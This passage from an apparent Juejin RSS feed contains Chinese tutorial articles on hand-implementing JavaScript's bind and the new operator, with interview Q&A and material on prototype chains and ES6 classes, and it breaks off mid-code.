    <span class="hljs-keyword">const</span> boundFunction = <span class="hljs-keyword">function</span> (<span class="hljs-params">...callArgs</span>) {
      <span class="hljs-comment">// 判断是否被new调用</span>
      <span class="hljs-keyword">const</span> isConstructorCall = <span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> boundFunction;

      <span class="hljs-comment">// 确定最终上下文</span>
      <span class="hljs-keyword">let</span> finalContext;
      <span class="hljs-keyword">if</span> (isConstructorCall) {
        <span class="hljs-comment">// new调用：忽略绑定的context，使用新实例</span>
        finalContext = <span class="hljs-variable language_">this</span>;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (boundContext == <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 非严格模式：使用全局对象</span>
        finalContext = globalThis;
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 普通调用：使用绑定的context</span>
        finalContext = boundContext;
      }

      <span class="hljs-comment">// 合并参数</span>
      <span class="hljs-keyword">const</span> allArgs = bindArgs.<span class="hljs-title function_">concat</span>(callArgs);

      <span class="hljs-comment">// 调用原函数</span>
      <span class="hljs-keyword">const</span> result = originalFunc.<span class="hljs-title function_">apply</span>(finalContext, allArgs);

      <span class="hljs-comment">// 处理构造函数调用的返回值</span>
      <span class="hljs-keyword">if</span> (isConstructorCall) {
        <span class="hljs-comment">// 如果原函数返回对象，则使用该对象</span>
        <span class="hljs-keyword">if</span> (result &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'function'</span>)) {
          <span class="hljs-keyword">return</span> result;
        }
        <span class="hljs-comment">// 否则返回新创建的实例</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
      }

      <span class="hljs-keyword">return</span> result;
    };

    <span class="hljs-comment">// 维护原型链 - 高性能版本</span>
    <span class="hljs-comment">// 避免直接修改boundFunction.prototype，使用中间函数</span>
    <span class="hljs-keyword">if</span> (originalFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
      <span class="hljs-title class_">EmptyFunction</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = originalFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
      boundFunction.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmptyFunction</span>();
      <span class="hljs-comment">// 恢复constructor属性</span>
      boundFunction.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = boundFunction;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 处理没有prototype的情况（如箭头函数）</span>
      boundFunction.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-literal">undefined</span>;
    }

    <span class="hljs-comment">// 添加不可枚举的原始函数引用（用于调试）</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'__originalFunction__'</span>, {
      <span class="hljs-attr">value</span>: originalFunc,
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>
    });

    <span class="hljs-comment">// 添加不可枚举的绑定信息</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'__bindContext__'</span>, {
      <span class="hljs-attr">value</span>: boundContext,
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>
    });

    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'__bindArgs__'</span>, {
      <span class="hljs-attr">value</span>: bindArgs,
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>
    });

    <span class="hljs-comment">// 设置适当的函数属性</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'length'</span>, {
      <span class="hljs-attr">value</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, originalFunc.<span class="hljs-property">length</span> - bindArgs.<span class="hljs-property">length</span>),
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>
    });

    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunction, <span class="hljs-string">'name'</span>, {
      <span class="hljs-attr">value</span>: <span class="hljs-string">`bound <span class="hljs-subst">${originalFunc.name || <span class="hljs-string">''</span>}</span>`</span>.<span class="hljs-title function_">trim</span>(),
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>
    });

    <span class="hljs-keyword">return</span> boundFunction;
  };
})();
</code></pre>
<h2 data-id="heading-17">面试常见问题与解答</h2>
<h3 data-id="heading-18">问题1：手写call的核心步骤是什么？</h3>
<ol>
<li>步骤1:  将函数设为上下文对象的属性</li>
<li>步骤2:  执行该函数</li>
<li>步骤3:  删除该属性</li>
<li>步骤4:  返回函数执行结果</li>
<li>关键点：
<ul>
<li>使用Symbol避免属性名冲突</li>
<li>处理null/undefined上下文</li>
<li>处理原始值上下文</li>
<li>使用展开运算符处理参数</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">问题2：bind如何处理new操作符？</h3>
<ol>
<li>通过 this instanceof boundFunction 判断是否被new调用</li>
<li>如果是new调用，忽略绑定的上下文，使用新创建的对象作为this</li>
<li>需要正确设置boundFunction的原型链，以支持instanceof</li>
<li>如果原构造函数返回对象，则使用该对象，否则返回新实例</li>
</ol>
<h3 data-id="heading-20">问题3：call、apply、bind的性能差异？</h3>
<ol>
<li>call通常比apply快，因为apply需要处理数组参数</li>
<li>bind创建新函数有开销，但多次调用时比重复call/apply高效</li>
</ol>
<h2 data-id="heading-21">结语</h2>
<p>通过深入理解call、apply、bind的实现原理，我们不仅能更好地回答面试问题，还能在实际开发中编写出更优雅、更高效的JavaScript代码。对于文章中错误的地方或者有任何问题，欢迎在评论区留言讨论！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 手写 new 操作符：深入理解对象创建]]></title>    <link>https://juejin.cn/post/7605792874173055039</link>    <guid>https://juejin.cn/post/7605792874173055039</guid>    <pubDate>2026-02-13T01:10:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605792874173055039" data-draft-id="7605807405306921023" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 手写 new 操作符：深入理解对象创建"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-13T01:10:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 手写 new 操作符：深入理解对象创建
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:10:10.000Z" title="Fri Feb 13 2026 01:10:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>当我们使用 new 关键字时，背后到底发生了什么？这个看似简单的操作，实际上完成了一系列复杂的步骤。理解 new 的工作原理，是掌握 JavaScript 面向对象编程的关键。</p>
</blockquote>
<h2 data-id="heading-0">前言：从 new 的神秘面纱说起</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>，今年<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>岁`</span>;
};

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'张三'</span>, <span class="hljs-number">25</span>);
</code></pre>
<p>上述代码中 new 到底创建了什么？为什么 this 指向了新对象？原型链是怎么建立的？如果构造函数有返回值会怎样？我们将通过本篇文章揭开 new 的神秘面纱，从零实现一个自己的 new 操作符。</p>
<h2 data-id="heading-1">理解 new</h2>
<p>new 的四个核心步骤：</p>
<ol>
<li>创建一个空对象</li>
<li>将对象的原型设置为构造函数的 prototype 属性</li>
<li>将构造函数的 this 绑定到新对象，并执行构造函数</li>
<li>判断返回值类型：如果构造函数返回一个对象（包括函数），则返回该对象；否则返回新创建的对象</li>
</ol>
<h2 data-id="heading-2">手写实现 new 操作符</h2>
<h3 data-id="heading-3">基础版本实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">constructor, ...args</span>) {

  <span class="hljs-comment">// 1. 创建一个空对象</span>
  <span class="hljs-keyword">const</span> obj = {};

  <span class="hljs-comment">// 2. 将对象的原型设置为构造函数的 prototype 属性</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

  <span class="hljs-comment">// 3. 将构造函数的 this 绑定到新对象，并执行构造函数</span>
  <span class="hljs-keyword">const</span> result = constructor.<span class="hljs-title function_">apply</span>(obj, args);

  <span class="hljs-comment">// 4. 判断返回值类型</span>
  <span class="hljs-comment">// 如果构造函数返回一个对象（包括函数），则返回该对象</span>
  <span class="hljs-comment">// 否则返回新创建的对象</span>
  <span class="hljs-keyword">const</span> isObject = result !== <span class="hljs-literal">null</span> &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'function'</span>);

  <span class="hljs-keyword">return</span> isObject ? result : obj;
}
</code></pre>
<h3 data-id="heading-4">处理边界情况</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNewEnhanced</span>(<span class="hljs-params">constructor, ...args</span>) {

  <span class="hljs-comment">// 边界情况1：constructor 不是函数</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> constructor !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">`<span class="hljs-subst">${constructor}</span> is not a constructor`</span>);
  }

  <span class="hljs-comment">// 边界情况2：箭头函数（没有 prototype）</span>
  <span class="hljs-keyword">if</span> (!constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">`<span class="hljs-subst">${constructor.name || constructor}</span> is not a constructor`</span>);
  }

  <span class="hljs-comment">// 1. 创建新对象（改进方法）：使用 Object.create 更优雅地设置原型</span>
  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

  <span class="hljs-comment">// 2. 调用构造函数</span>
  <span class="hljs-keyword">let</span> result;
  <span class="hljs-keyword">try</span> {
    result = constructor.<span class="hljs-title function_">apply</span>(obj, args);
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-comment">// 如果构造函数抛出异常，直接传播</span>
    <span class="hljs-keyword">throw</span> error;
  }

  <span class="hljs-comment">// 3. 处理返回值</span>
  <span class="hljs-comment">// 注意：null 也是 object 类型，但需要特殊处理</span>
  <span class="hljs-keyword">const</span> resultType = <span class="hljs-keyword">typeof</span> result;
  <span class="hljs-keyword">const</span> isObject = result !== <span class="hljs-literal">null</span> &amp;&amp; (resultType === <span class="hljs-string">'object'</span> || resultType === <span class="hljs-string">'function'</span>);

  <span class="hljs-keyword">return</span> isObject ? result : obj;
}

</code></pre>
<h3 data-id="heading-5">完整实现与原型链优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-params">constructor, ...args</span>) {
  <span class="hljs-comment">// 1. 参数验证</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> constructor !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">`Constructor <span class="hljs-subst">${constructor}</span> is not a function`</span>);
  }

  <span class="hljs-comment">// 2. 检查是否为可构造的函数：箭头函数和部分内置方法没有 prototype</span>
  <span class="hljs-keyword">if</span> (!constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> &amp;&amp; !<span class="hljs-title function_">isNativeConstructor</span>(constructor)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">`<span class="hljs-subst">${getFunctionName(constructor)}</span> is not a constructor`</span>);
  }

  <span class="hljs-comment">// 3. 创建新对象并设置原型链</span>
  <span class="hljs-keyword">const</span> proto = constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> || <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto);

  <span class="hljs-comment">// 4. 绑定 constructor 属性</span>
  obj.<span class="hljs-property">constructor</span> = constructor; 

  <span class="hljs-comment">// 5. 执行构造函数</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(constructor, args, constructor);

  <span class="hljs-comment">// 6. 处理返回值</span>
  <span class="hljs-comment">// Reflect.construct 已经处理了返回值逻辑</span>
  <span class="hljs-comment">// 但我们还是实现自己的逻辑以保持一致</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">processConstructorResult</span>(result, obj, constructor);
}

<span class="hljs-comment">// 辅助函数：检查是否为原生构造函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isNativeConstructor</span>(<span class="hljs-params">fn</span>) {
  <span class="hljs-comment">// 一些内置构造函数如 Symbol、BigInt 没有 prototype</span>
  <span class="hljs-keyword">const</span> nativeConstructors = [
    <span class="hljs-string">'Number'</span>, <span class="hljs-string">'String'</span>, <span class="hljs-string">'Boolean'</span>, <span class="hljs-string">'Symbol'</span>, <span class="hljs-string">'BigInt'</span>,
    <span class="hljs-string">'Date'</span>, <span class="hljs-string">'RegExp'</span>, <span class="hljs-string">'Error'</span>, <span class="hljs-string">'Array'</span>, <span class="hljs-string">'Object'</span>, <span class="hljs-string">'Function'</span>
  ];

  <span class="hljs-keyword">return</span> nativeConstructors.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span>
    fn.<span class="hljs-property">name</span> === name || fn === globalThis[name]
  );
}

<span class="hljs-comment">// 辅助函数：获取函数名</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getFunctionName</span>(<span class="hljs-params">fn</span>) {
  <span class="hljs-keyword">if</span> (fn.<span class="hljs-property">name</span>) <span class="hljs-keyword">return</span> fn.<span class="hljs-property">name</span>;
  <span class="hljs-keyword">const</span> match = fn.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^function\s*([^\s(]+)/</span>);
  <span class="hljs-keyword">return</span> match ? match[<span class="hljs-number">1</span>] : <span class="hljs-string">'anonymous'</span>;
}

<span class="hljs-comment">// 辅助函数：处理构造函数返回值</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processConstructorResult</span>(<span class="hljs-params">result, defaultObj, constructor</span>) {
  <span class="hljs-comment">// 如果 result 是 undefined 或 null，返回 defaultObj</span>
  <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">return</span> defaultObj;
  }

  <span class="hljs-comment">// 检查 result 的类型</span>
  <span class="hljs-keyword">const</span> type = <span class="hljs-keyword">typeof</span> result;

  <span class="hljs-comment">// 如果是对象或函数，返回 result</span>
  <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'object'</span> || type === <span class="hljs-string">'function'</span>) {
    <span class="hljs-comment">// 额外检查：如果 result 是构造函数本身的实例，确保原型链正确</span>
    <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> constructor) {
      <span class="hljs-keyword">return</span> result;
    }
    <span class="hljs-keyword">return</span> result;
  }

  <span class="hljs-comment">// 原始值，返回 defaultObj</span>
  <span class="hljs-keyword">return</span> defaultObj;
}
</code></pre>
<h2 data-id="heading-6">深入原型链与继承</h2>
<h3 data-id="heading-7">原型链的建立过程</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 父构造函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-comment">// 父类方法</span>
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> 叫了`</span>;
};
<span class="hljs-comment">// 子构造函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, breed</span>) {
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;
}
<span class="hljs-comment">// 建立原型链</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;
<span class="hljs-comment">// 子类方法</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> 汪汪叫`</span>;
};
<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'旺财'</span>, <span class="hljs-string">'金毛'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">speak</span>()); <span class="hljs-comment">// 旺财 叫了</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">bark</span>());  <span class="hljs-comment">// 旺财 汪汪叫</span>
</code></pre>
<h3 data-id="heading-8">ES6 类与 new 的关系</h3>
<p>ES6 类的本质还是基于原型的语法糖：</p>
<h4 data-id="heading-9">ES6 基本写法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }

  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
  }
}
<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'张三'</span>, <span class="hljs-number">30</span>);
</code></pre>
<h4 data-id="heading-10">对应 ES5 的写法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">PersonES5</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// 类构造器中的代码</span>
  <span class="hljs-keyword">if</span> (!(<span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PersonES5</span>)) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Class constructor Person cannot be invoked without 'new'"</span>);
  }

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-comment">// 实例方法（添加到原型）</span>
<span class="hljs-title class_">PersonES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
};
<span class="hljs-keyword">const</span> personES5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PersonES5</span>(<span class="hljs-string">'李四'</span>, <span class="hljs-number">25</span>);
</code></pre>
<h3 data-id="heading-11">类的重要特性</h3>
<ol>
<li>类必须用 new 调用</li>
<li>类方法不可枚举</li>
<li>类没有变量提升</li>
</ol>
<h3 data-id="heading-12">ES6 实现继承的完整示例</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' 叫了'</span>);
  }
}
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">super</span>(name);
